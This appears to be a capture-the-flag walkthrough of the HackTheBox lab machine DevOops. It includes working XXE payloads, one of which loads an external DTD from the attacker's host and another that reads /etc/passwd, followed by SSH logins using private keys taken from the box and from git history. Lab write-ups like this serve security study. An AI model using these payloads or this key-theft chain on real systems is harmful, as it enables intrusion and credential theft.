DevOops is another 'more challenging' than OSCP boxes from TJNull's list.


nmap first.

<h3>Nmap</h3>

```
nmap -sV -Pn --min-rate 10000 -p- 10.10.10.91 |tee -a devoops.txt

```

`/feed` seems to show a png with info about aws.

`/upload` may be a possible vector of attack.

![upload](/assets/img/dev0ops/devoops-upload.png)


I make a test.xml file to upload, to see if it will work.

```xml

<note>
<Author>Shin0bi</Author>
<Subject>testes</Subject>
<Content>testes...testes...1...2...3???</Content>
</note>

```


The result is reflected on the webpage.

<hr width="250" size="6">


make evil.xml:

```

<!--?xml version="1.0" ?-->
<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://10.10.14.24/1.dtd">%remote;%int;%trick;]>
<note>
<Author>&b;</Author>
<Subject>sh1n</Subject>  
<Content>Reminder</Content>
</note>

```

This will call 1.dtd from Kali through the python webserver
```
python3 -m http.server 80
```

contents of 1.dtd:


```
<p class="p1"><!ENTITY b SYSTEM "file:///etc/passwd" ></p>
```

`500 server error....didnt work....`


Create mal.xml, this one doesn't require 1.dtd

```xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
        <Author>lhm</Author>

```

The result was not entirely what was expected:

We've ended up with a private id_rsa key, likely for user `roosa` mentioned in the filepath.

Copy its contents as `rsa_key`

```
chmod 600 rsa_key
```

Then try to ssh into the target as roosa.

```
ssh -i rsa_key roosa@10.10.10.91
```

It works! we now have roosa's shell...and the user flag.

```
roosa@gitter:~$ cat user.txt
c5xxxxxxxxxxxxxxxxxxxxxxxxxxxx7b

Besides running the gunicorn.sh file (which runs the webservice), the user seems to work
a lot with `git`.

There's a `work` folder in the user's home directory, and another inside called `blogfeed`.

It also seems that the user generated new authentication keys.


`cd work/blogfeed`


```
git log -p
```

The log is long, and reveals another private ssh key.

My experience of git is very limited, but it looks like the key with each line preceeded with a minus (-)
is being replaced with that whose lines start with pluses (+)

It also helps that my terminal has the outgoing as coloured red and the incomming as green.



I copypaste the green key to Kali, and remove the `+` in each line...

I follow the same proceedure as before...saving the file this time as `rkey`

```
chmod 600 rkey
```

use it to login via ssh as root:


```
ssh -i rkey root@10.10.10.91
```

Getting the root flag is a simple formality from here.
